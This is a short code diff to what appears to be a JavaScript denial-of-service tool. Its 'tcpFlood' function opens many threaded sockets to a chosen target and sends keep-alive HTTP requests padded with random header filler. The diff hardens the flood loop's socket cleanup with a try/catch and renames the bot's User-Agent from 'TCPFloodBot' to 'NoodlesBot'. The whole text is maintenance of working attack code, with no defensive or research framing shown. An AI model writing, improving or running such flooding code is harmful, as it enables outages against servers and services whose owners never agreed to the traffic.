@@ -45,7 +45,11 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
     if (index > -1) {
       sockets.splice(index, 1);
     }
-    socket.destroy();
+    try {
+        socket.destroy();
+    } catch (e) {
+        console.error("Error destroying socket:", e)
+    }
   }
 
   for (let i = 0; i < threads; i++) {
@@ -73,7 +77,7 @@ async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCa
             const payload = "GET / HTTP/1.1\r\n" +
               "Host: " + target + "\r\n" +
               "Connection: keep-alive\r\n" +
-              "User-Agent: TCPFloodBot\r\n" +
+              "User-Agent: NoodlesBot\r\n" +
               "X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n" +
               "\r\n";
             socket.write(payload);
